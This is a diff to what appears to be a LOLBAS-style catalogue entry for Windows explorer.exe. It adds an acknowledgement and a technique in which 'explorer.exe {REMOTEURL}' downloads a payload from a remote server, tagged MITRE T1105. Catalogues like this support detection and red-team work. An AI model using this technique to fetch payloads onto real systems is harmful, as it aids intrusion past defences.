@@ -22,6 +22,13 @@ Commands:
     OperatingSystem: Windows 10, Windows 11
     Tags:
       - Execute: EXE
+  - Command: explorer.exe {REMOTEURL}
+    Description: Opens a URL in the default web browser and downloads a file.
+    Usecase: Downloads payload from remote server.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\explorer.exe
   - Path: C:\Windows\SysWOW64\explorer.exe
@@ -39,3 +46,4 @@ Acknowledgement:
     Handle: '@CyberRaiju'
   - Person: Jimmy
     Handle: '@bohops'
+  - Person: Liran Ravich, CardinalOps
